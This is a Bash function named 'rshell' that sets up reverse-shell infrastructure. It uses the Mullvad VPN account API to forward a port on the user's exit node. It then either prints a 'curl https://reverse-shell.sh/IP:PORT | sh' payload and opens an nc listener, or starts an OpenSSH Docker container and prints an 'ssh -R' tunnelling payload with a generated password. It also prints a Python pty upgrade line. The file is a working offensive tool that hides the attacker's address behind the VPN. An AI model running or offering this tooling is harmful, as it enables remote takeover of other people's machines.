rshell(){
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    PURPLE='\033[0;35m'
    CYAN='\033[0;36m'
    YELLOW='\033[1;33m'
    NC='\033[0m'
    jq -V >/dev/null 2>&1 || { echo >&2 "${RED}JQ is needed${NC}"; return 1; }
    mullvad version >/dev/null 2>&1 || { echo >&2 "${RED}Mullvad is needed${NC}"; return 1; }
    account_id=$(mullvad account get | grep -i account | cut -d':' -f2 | cut -c2-)
    device_name=$(mullvad account get | grep -i device | cut -d':' -f2 | cut -c2-)
    account=$(curl -s "https://api-www.mullvad.net/www/accounts/$account_id/")
    token=$(echo $account | jq -r .auth_token)
    node=$(curl -s https://am.i.mullvad.net/json | jq -r .mullvad_exit_ip_hostname | cut -d\- -f1-2)
    if [[ $node == "null" ]]; then echo >&2 "${RED}Not connected to Mullvad${NC}"; return 1; fi
    ip=$(curl -s https://am.i.mullvad.net/ip)
    device=$(echo $account | jq ".account.wg_peers[] | select(.device_name | test(\"$device_name\";\"i\"))")
    device_key=$(echo $device | jq -r .key.public)
    port=0

    for row in $(echo "${device}" | jq -r '.city_ports[] | @base64'); do
        _jq(){ echo ${row} | base64 --decode | jq -r ${1}; }
        echo "Existing port: ${CYAN}$(_jq '.city_code'):$(_jq '.port')${NC}"
        if [[ $(_jq '.city_code') == $node ]] ;then
            port=$(_jq '.port')
        fi
        if [[ $1 == "clear" ]] ;then
            echo "${RED}Deleted${NC}"
            curl -s -X POST -H "Authorization: Token $token" -H 'Content-Type: application/json' -d "{\"port\":\"$(_jq '.port')\",\"city_code\":\"$(_jq '.city_code')\"}" https://api-www.mullvad.net/www/ports/remove/
        fi
    done
    if [[ $1 == "clear" ]] ;then return; fi
    if [ "$port" -eq "0" ]; then
        echo -e "\n${GREEN}Create new port tunnel${NC}"
        port=$(curl -s -X POST -H "Authorization: Token $token" -H 'Content-Type: application/json' -d "{\"pubkey\":\"$device_key\",\"city_code\":\"$node\"}" https://api-www.mullvad.net/www/ports/add/ | jq -r .port)
    fi
    if [[ $1 == "nat" ]] ;then
        docker -v >/dev/null 2>&1 || { echo >&2 "${RED}Docker is needed${NC}"; return 1; }
        [ -n "$2" ] && [ "$2" -eq "$2" ] 2>/dev/null # Check if 2nd arg is a number
        if [ $? -ne 0 ]; then echo >&2 "Usage: rshell nat [remote_port] [ssh_password]"; return 1; fi
        remote_port=$2
        LC_CTYPE=C
        user="user"
        password=${3:=$(LC_CTYPE=C;tr -dc a-z0-9 </dev/urandom | head -c 8;echo '')}
        container_name="rnat-$port-$remote_port"
        docker run -p $port:2222 -p $remote_port:$remote_port -e USER_NAME=$user -e USER_PASSWORD=$password -e PASSWORD_ACCESS=true -e DOCKER_MODS=linuxserver/mods:openssh-server-ssh-tunnel --rm --name $container_name -d linuxserver/openssh-server:latest
        echo -e "\nSSH server container: ${GREEN}$container_name${NC}"
        echo -e "\nPayload: ${PURPLE}ssh -R 0.0.0.0:$remote_port:127.0.0.1:$remote_port -N -p $port $user@$ip${NC}"
        echo -e "\nSSH password: ${YELLOW}$password${NC}"
    else
        echo -e "\nPayload: ${PURPLE}curl https://reverse-shell.sh/$ip:$port | sh${NC}"
        echo -e "\nFor a PTY: ${YELLOW}python3 -c 'import pty; pty.spawn(\"/bin/bash\")'${NC}"
        echo -e "\n\n\n >>>>>Listening<<<<<"
        [[ "$OSTYPE" == "darwin"* ]] && o='' || o='p'
        nc -lv$o $port
    fi
}